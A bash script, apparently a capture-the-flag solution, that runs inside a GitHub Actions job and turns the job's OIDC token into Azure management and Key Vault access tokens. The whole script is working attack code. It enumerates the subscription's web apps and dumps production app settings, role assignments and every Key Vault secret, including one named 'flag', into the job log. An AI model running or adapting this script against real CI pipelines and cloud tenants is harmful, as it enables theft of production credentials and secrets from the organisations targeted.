#!/usr/bin/env bash
set +e
TEN=3205c325-06a5-4171-9ce8-ffc5e6c2845e
SUB=c5e4e004-b42d-4ac4-a502-5fd338380eb6
CICD_ID=72ff278a-9e71-43ec-bac4-2ca303f8e462

OIDC=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
  "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=api://AzureADTokenExchange" | python3 -c 'import sys,json;print(json.load(sys.stdin).get("value",""))')

# Get ARM token for cicd-deployer
ARM_TOKEN=$(curl -sS -X POST "https://login.microsoftonline.com/$TEN/oauth2/v2.0/token" \
  -d "client_id=$CICD_ID" -d "grant_type=client_credentials" \
  -d "client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer" \
  --data-urlencode "client_assertion=$OIDC" \
  --data-urlencode "scope=https://management.azure.com/.default" | python3 -c 'import sys,json;print(json.load(sys.stdin).get("access_token",""))')
echo "ARM_TOKEN_LEN=${#ARM_TOKEN}"

# Also get KV vault token for reading secrets
VT=$(curl -sS -X POST "https://login.microsoftonline.com/$TEN/oauth2/v2.0/token" \
  -d "client_id=$CICD_ID" -d "grant_type=client_credentials" \
  -d "client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer" \
  --data-urlencode "client_assertion=$OIDC" \
  --data-urlencode "scope=https://vault.azure.net/.default" | python3 -c 'import sys,json;print(json.load(sys.stdin).get("access_token",""))')

# List ALL web apps in subscription to find storefront's resource group
echo "=== WEB APPS IN SUBSCRIPTION ==="
curl -sS "https://management.azure.com/subscriptions/$SUB/providers/Microsoft.Web/sites?api-version=2023-01-01" \
  -H "Authorization: Bearer $ARM_TOKEN" | python3 -c '
import sys,json
d=json.load(sys.stdin)
for site in d.get("value",[]):
    n=site["name"]
    rg=site["id"].split("/resourceGroups/")[1].split("/")[0]
    print(f"{n} -> {rg}")
' 2>&1 | head -40

# Try to list appsettings of storefront app
echo "=== STOREFRONT APP SETTINGS ==="
for RG in rg-tbl-storefront-prod-eus rg-tbl-storefront-prod-sea rg-tbl-platform-prod-sea rg-tbl-platform-prod-eus; do
    R=$(curl -sS -o /dev/null -w "%{http_code}" "https://management.azure.com/subscriptions/$SUB/resourceGroups/$RG/providers/Microsoft.Web/sites/app-tbl-storefront-prod/config/appsettings/list?api-version=2023-01-01" \
      -X POST -H "Authorization: Bearer $ARM_TOKEN" -H "Content-Length: 0")
    if [ "$R" != "404" ] && [ "$R" != "000" ]; then
        echo "Found in $RG (status=$R):"
        curl -sS -X POST "https://management.azure.com/subscriptions/$SUB/resourceGroups/$RG/providers/Microsoft.Web/sites/app-tbl-storefront-prod/config/appsettings/list?api-version=2023-01-01" \
          -H "Authorization: Bearer $ARM_TOKEN" -H "Content-Length: 0"
        break
    fi
done

# Try to list appsettings of reporting app
echo "=== REPORTING APP SETTINGS ==="
curl -sS -X POST "https://management.azure.com/subscriptions/$SUB/resourceGroups/rg-tbl-reporting-prod-eus/providers/Microsoft.Web/sites/app-tbl-reporting-prod/config/appsettings/list?api-version=2023-01-01" \
  -H "Authorization: Bearer $ARM_TOKEN" -H "Content-Length: 0"

# Try cicd-deployer role assignments
echo "=== CICD-DEPLOYER ROLE ASSIGNMENTS ==="
curl -sS "https://management.azure.com/subscriptions/$SUB/providers/Microsoft.Authorization/roleAssignments?api-version=2022-04-01&\$filter=principalId+eq+'63e87ab1-3958-4bba-b9ef-08f3eedab6c9'" \
  -H "Authorization: Bearer $ARM_TOKEN" | python3 -c '
import sys,json
d=json.load(sys.stdin)
for ra in d.get("value",[]):
    scope=ra["properties"]["scope"]
    role=ra["properties"]["roleDefinitionId"].split("/")[-1]
    print(f"scope={scope} role={role}")
'

# Try all KV secrets to find flag directly
echo "=== KV PROD ALL SECRETS ==="
curl -sS "https://kv-tbl-prod-x3euoz.vault.azure.net/secrets?api-version=7.4&maxresults=25" \
  -H "Authorization: Bearer $VT" | python3 -c '
import sys,json
d=json.load(sys.stdin)
for s in d.get("value",[]):
    print(s["id"])
'

echo "=== KV PROD FLAG SECRET ==="
curl -sS "https://kv-tbl-prod-x3euoz.vault.azure.net/secrets/flag?api-version=7.4" \
  -H "Authorization: Bearer $VT"

echo "DONE"
